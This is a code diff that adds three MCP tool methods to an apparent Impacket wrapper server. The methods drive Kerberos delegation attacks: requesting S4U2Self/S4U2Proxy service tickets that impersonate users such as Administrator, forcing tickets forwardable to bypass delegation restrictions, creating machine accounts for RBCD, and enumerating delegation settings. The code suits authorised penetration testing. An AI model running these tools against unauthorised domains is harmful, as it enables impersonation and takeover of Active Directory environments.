@@ -388,6 +388,89 @@ class ImpacketServer(BaseMCPServer):
             handler=self.get_tgt,
         )
 
+        self.register_method(
+            name="get_st",
+            description="Request a Kerberos service ticket (TGS) via S4U2Self/S4U2Proxy for constrained delegation abuse. Saves ccache to /session/ for persistence.",
+            params={
+                **self._auth_params(),
+                "spn": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Target SPN (e.g., 'cifs/dc.corp.local', 'http/web.corp.local')",
+                },
+                "impersonate": {
+                    "type": "string",
+                    "required": True,
+                    "description": "User to impersonate via S4U2Self/S4U2Proxy (e.g., 'Administrator')",
+                },
+                "additional_ticket": {
+                    "type": "string",
+                    "description": "Path to additional ticket for S4U2Proxy (ccache file from RBCD or similar)",
+                },
+                "force_forwardable": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Force the service ticket to be forwardable (bypass delegation restrictions)",
+                },
+                "altservice": {
+                    "type": "string",
+                    "description": "Alternative service name for the ticket (e.g., 'cifs/dc.corp.local' to get CIFS access via HTTP delegation)",
+                },
+                "timeout": {
+                    "type": "integer",
+                    "default": 60,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.get_st,
+        )
+
+        self.register_method(
+            name="addcomputer",
+            description="Create a machine account in Active Directory for RBCD and other delegation attacks",
+            params={
+                **self._auth_params(),
+                "computer_name": {
+                    "type": "string",
+                    "description": "Name for the new machine account (default: random). Do NOT include trailing '$'.",
+                },
+                "computer_pass": {
+                    "type": "string",
+                    "description": "Password for the new machine account (default: random)",
+                },
+                "method": {
+                    "type": "enum",
+                    "values": ["SAMR", "LDAPS"],
+                    "default": "SAMR",
+                    "description": "Creation method: SAMR (default, uses SMB) or LDAPS (uses LDAP over TLS)",
+                },
+                "base_dn": {
+                    "type": "string",
+                    "description": "Base DN for LDAPS method (e.g., 'DC=corp,DC=local'). Auto-derived from domain if omitted.",
+                },
+                "timeout": {
+                    "type": "integer",
+                    "default": 60,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.addcomputer,
+        )
+
+        self.register_method(
+            name="find_delegation",
+            description="Enumerate delegation settings (unconstrained, constrained, RBCD) across all domain accounts",
+            params={
+                **self._auth_params(),
+                "timeout": {
+                    "type": "integer",
+                    "default": 120,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.find_delegation,
+        )
+
     # ── Helpers ──────────────────────────────────────────────────────────
 
     def _auth_params(self, extra_params: Optional[Dict] = None) -> Dict[str, Dict[str, Any]]:
@@ -1613,6 +1696,215 @@ class ImpacketServer(BaseMCPServer):
                     "ccache_file": ccache_path,
                     "ccache_exists": ccache_exists,
                     "hint": f"Set KRB5CCNAME={ccache_path} to use this ticket" if ccache_path else None,
+                },
+                raw_output=sanitize_output(combined),
+            )
+        except ToolError as e:
+            return ToolResult(success=False, data={"target": target}, error=str(e))
+
+    async def get_st(
+        self,
+        target: str,
+        spn: str,
+        impersonate: str,
+        username: Optional[str] = None,
+        password: Optional[str] = None,
+        domain: Optional[str] = None,
+        hashes: Optional[str] = None,
+        kerberos: bool = False,
+        dc_ip: Optional[str] = None,
+        aes_key: Optional[str] = None,
+        port: Optional[int] = None,
+        additional_ticket: Optional[str] = None,
+        force_forwardable: bool = False,
+        altservice: Optional[str] = None,
+        timeout: int = 60,
+    ) -> ToolResult:
+        """Request a service ticket via S4U2Self/S4U2Proxy for constrained delegation."""
+        self.logger.info(f"Requesting ST for {impersonate} -> {spn}")
+
+        identity_str, extra_args = self._build_domain_auth_args(
+            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
+        )
+
+        cmd = ["impacket-getST"]
+        cmd.extend(extra_args)
+        cmd.extend(["-spn", spn])
+        cmd.extend(["-impersonate", impersonate])
+
+        if additional_ticket:
+            cmd.extend(["-additional-ticket", additional_ticket])
+        if force_forwardable:
+            cmd.append("-force-forwardable")
+        if altservice:
+            cmd.extend(["-altservice", altservice])
+
+        cmd.append(identity_str)
+
+        try:
+            result = await self.run_command(cmd, timeout=timeout)
+            combined = result.stdout + result.stderr
+
+            # Find the generated ccache file
+            ccache_path = None
+            ccache_match = re.search(r"Saving ticket in (\S+\.ccache)", combined)
+            if ccache_match:
+                ccache_path = ccache_match.group(1)
+
+            # Copy ccache to /session/ for persistence across calls
+            session_ccache = None
+            if ccache_path and os.path.exists(ccache_path):
+                session_dir = "/session"
+                if os.path.isdir(session_dir):
+                    session_ccache = os.path.join(session_dir, os.path.basename(ccache_path))
+                    import shutil
+                    shutil.copy2(ccache_path, session_ccache)
+
+            ccache_exists = ccache_path is not None and os.path.exists(ccache_path)
+
+            return ToolResult(
+                success=result.returncode == 0 or ccache_exists,
+                data={
+                    "target": target,
+                    "spn": spn,
+                    "impersonate": impersonate,
+                    "ccache_file": session_ccache or ccache_path,
+                    "ccache_exists": ccache_exists,
+                    "hint": f"Set KRB5CCNAME={session_ccache or ccache_path} to use this ticket" if ccache_path else None,
+                },
+                raw_output=sanitize_output(combined),
+            )
+        except ToolError as e:
+            return ToolResult(success=False, data={"target": target, "spn": spn}, error=str(e))
+
+    async def addcomputer(
+        self,
+        target: str,
+        username: Optional[str] = None,
+        password: Optional[str] = None,
+        domain: Optional[str] = None,
+        hashes: Optional[str] = None,
+        kerberos: bool = False,
+        dc_ip: Optional[str] = None,
+        aes_key: Optional[str] = None,
+        port: Optional[int] = None,
+        computer_name: Optional[str] = None,
+        computer_pass: Optional[str] = None,
+        method: str = "SAMR",
+        base_dn: Optional[str] = None,
+        timeout: int = 60,
+    ) -> ToolResult:
+        """Create a machine account in Active Directory."""
+        self.logger.info(f"Adding computer account via {method}")
+
+        identity_str, extra_args = self._build_domain_auth_args(
+            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
+        )
+
+        cmd = ["impacket-addcomputer"]
+        cmd.extend(extra_args)
+        cmd.extend(["-method", method])
+
+        if computer_name:
+            cmd.extend(["-computer-name", computer_name])
+        if computer_pass:
+            cmd.extend(["-computer-pass", computer_pass])
+        if base_dn:
+            cmd.extend(["-baseDN", base_dn])
+
+        cmd.append(identity_str)
+
+        try:
+            result = await self.run_command(cmd, timeout=timeout)
+            combined = result.stdout + result.stderr
+
+            # Parse computer name and password from output
+            created_name = computer_name
+            created_pass = computer_pass
+            name_match = re.search(r"Successfully added machine account (\S+)", combined)
+            if name_match:
+                created_name = name_match.group(1)
+            pass_match = re.search(r"with password (\S+)", combined)
+            if pass_match:
+                created_pass = pass_match.group(1)
+
+            success = result.returncode == 0 or "Successfully added" in combined
+
+            return ToolResult(
+                success=success,
+                data={
+                    "target": target,
+                    "computer_name": created_name,
+                    "computer_pass": created_pass,
+                    "method": method,
+                },
+                raw_output=sanitize_output(combined),
+            )
+        except ToolError as e:
+            return ToolResult(success=False, data={"target": target}, error=str(e))
+
+    async def find_delegation(
+        self,
+        target: str,
+        username: Optional[str] = None,
+        password: Optional[str] = None,
+        domain: Optional[str] = None,
+        hashes: Optional[str] = None,
+        kerberos: bool = False,
+        dc_ip: Optional[str] = None,
+        aes_key: Optional[str] = None,
+        port: Optional[int] = None,
+        timeout: int = 120,
+    ) -> ToolResult:
+        """Enumerate delegation settings across domain accounts."""
+        self.logger.info(f"Finding delegation settings in {domain or target}")
+
+        identity_str, extra_args = self._build_domain_auth_args(
+            target, username, password, domain, hashes, kerberos, dc_ip, aes_key, port,
+        )
+
+        cmd = ["impacket-findDelegation"]
+        cmd.extend(extra_args)
+        cmd.append(identity_str)
+
+        try:
+            result = await self.run_command(cmd, timeout=timeout)
+            combined = result.stdout + result.stderr
+
+            # Parse tabular output into structured data
+            delegations = []
+            header_found = False
+            for line in combined.split("\n"):
+                stripped = line.strip()
+                if not stripped:
+                    continue
+                # Skip Impacket banner and info lines
+                if stripped.startswith("Impacket ") or stripped.startswith("[*]"):
+                    continue
+                # Detect header row
+                if "AccountName" in stripped and "DelegationType" in stripped:
+                    header_found = True
+                    continue
+                # Skip separator lines (-----)
+                if stripped.startswith("---"):
+                    continue
+                # Parse data rows (space-separated columns)
+                if header_found:
+                    cols = stripped.split()
+                    if len(cols) >= 4:
+                        delegations.append({
+                            "account_name": cols[0],
+                            "account_type": cols[1],
+                            "delegation_type": cols[2],
+                            "delegation_rights_to": " ".join(cols[3:]),
+                        })
+
+            return ToolResult(
+                success=result.returncode == 0 or len(delegations) > 0,
+                data={
+                    "target": target,
+                    "delegations": delegations,
+                    "delegation_count": len(delegations),
                 },
                 raw_output=sanitize_output(combined),
             )
